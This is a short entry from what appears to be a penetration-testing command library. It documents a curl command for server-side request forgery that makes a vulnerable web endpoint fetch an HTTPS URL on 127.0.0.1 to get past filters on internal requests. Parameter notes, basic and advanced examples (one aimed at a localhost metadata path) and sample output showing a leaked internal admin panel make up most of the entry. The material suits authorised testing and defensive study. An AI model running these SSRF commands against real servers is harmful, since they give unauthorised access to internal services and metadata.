---
id: 3dd4a775-f680-4507-899d-e17486b5212b
name: curl-ssrf-https-localhost
type: command
executor: bash
data: >-
  curl -X GET
  "http://$_TARGET_ENDPOINT?url=https://127.0.0.1:$_INTERNAL_PORT/internal" -v
output: null
created_at: '2023-04-06T03:56:37.237040+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - bypass
verified: true
validated: true
---

# curl-ssrf-https-localhost

## Command

```bash
curl -X GET "http://$_TARGET_ENDPOINT?url=https://127.0.0.1:$_INTERNAL_PORT/internal" -v
```

## Description

This command uses curl to test for SSRF by sending a crafted HTTPS URL targeting localhost to a vulnerable endpoint. It helps bypass filters blocking HTTP internal requests, forcing the server to fetch from 127.0.0.1 over HTTPS. Use this during web vulnerability assessment to probe internal services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_ENDPOINT | The vulnerable URL of the application (e.g., http://target.com/api/fetch) | Yes |
| $_INTERNAL_PORT | The port of the internal service on localhost (e.g., 8080 for a local admin panel) | Yes |
| -X GET | Specifies the HTTP method | Built-in |
| -v | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://example.com/fetch?url=https://127.0.0.1/" -v
```

### Advanced Usage

```bash
curl -X POST "http://example.com/upload" -d 'url=https://localhost:8443/metadata' -v
```

## Expected Output

Successful execution might return the content from the internal service in the response body, such as:

```
< HTTP/1.1 200 OK
< Content-Type: text/html

<html><body>Internal Admin Panel</body></html>
```

Or error messages indicating the fetch occurred, like connection timeouts or leaked headers. Failure shows a standard 4xx/5xx without internal data.

## Related

- [[procedures/Server-Side-Request-Forgery-via-Bypassing-Filters-with-HTTPS]]
